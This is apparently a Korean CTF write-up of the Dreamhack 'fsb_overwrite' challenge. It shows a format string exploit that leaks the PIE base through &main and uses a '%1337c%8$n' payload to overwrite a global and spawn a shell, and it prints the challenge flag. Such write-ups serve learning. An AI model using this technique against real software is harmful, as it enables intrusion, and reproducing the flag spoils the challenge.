---
title: "[Dreamhack] fsb_overwrite 라이트업"
description: printf(buf) 하나로 PIE 베이스를 흘리고, %n으로 전역 변수를 덮어 셸을 얻은 과정입니다.
date: 2026-10-29 21:00:00 +0900
category: ctf-wargame
tags: [pwnable, dreamhack, format-string, pie, writeup]
---

포맷 스트링 버그 하나로 읽기와 쓰기를 모두 얻는 문제입니다. 개념은 [FSB 정리](/posts/concept-format-string/)에 적어 뒀습니다.

## 보호기법과 버그

```text
Arch:  amd64-64-little
RELRO: Full RELRO     ← GOT 덮어쓰기 불가
PIE:   enabled        ← 먼저 PIE base leak 필요
```

```c
int changeme;              // 전역
int main() {
    char buf[0x20];
    while (1) {
        get_string(buf, 0x20);
        printf(buf);           // ← 포맷 스트링 버그
        if (changeme == 1337)
            system("/bin/sh");
    }
}
```

입력을 포맷 문자열로 바로 씁니다. 목표는 전역 `changeme`를 1337로 만드는 것입니다. 루프라 leak과 write를 두 단계로 나눌 수 있습니다.

## 버퍼 위치 찾기

```text
AAAAAAAA%6$p  →  0x4141414141414141  이므로  buf = %6$
```

## PIE base는 &main을 흘려서 복구

`main`은 이미지 베이스에서 `+0x1293` 위치입니다. 하위 12비트가 `0x293`이죠. 스택 깊은 곳에 `&main`이 올라와 있어서, 슬롯을 훑어 하위 12비트가 `0x293`이고 libc나 스택 포인터가 아닌 값을 찾으면 그게 `&main`입니다.

슬롯 번호가 환경마다 달랐습니다. 로컬은 `%17$`, 리모트는 `%15$`였습니다. 그래서 고정 슬롯 대신 페이지 오프셋으로 자동 탐지하게 만든 게 로컬과 리모트 공용의 열쇠였습니다.

## 무엇을 덮을까

Full RELRO라 GOT는 읽기 전용입니다. 그래서 전역 `changeme`를 노립니다. `%n`이 정확히 4바이트를 쓰니 int 타입과도 맞습니다.

```python
# buf = %6$  이므로  buf+16 = %8$
payload = b"%1337c%8$n" + b"A"*6 + p64(changeme)
```

`%1337c`로 1337자를 출력하고 `%8$n`이 그 수를 `changeme`에 적습니다. 다음 루프에서 조건이 맞아 `system("/bin/sh")`가 실행됩니다.

```text
DH{b283dec57b17112a4e9aa6d5499c0f28}
```

## 한 줄 정리

printf(buf) 하나로 `%p`(leak)와 `%n`(write)을 모두 얻습니다. PIE는 `&main`을 흘려 베이스를 복구하고, Full RELRO라 GOT 대신 승리 변수 `changeme`를 1337로 적어 셸을 띄웠습니다.
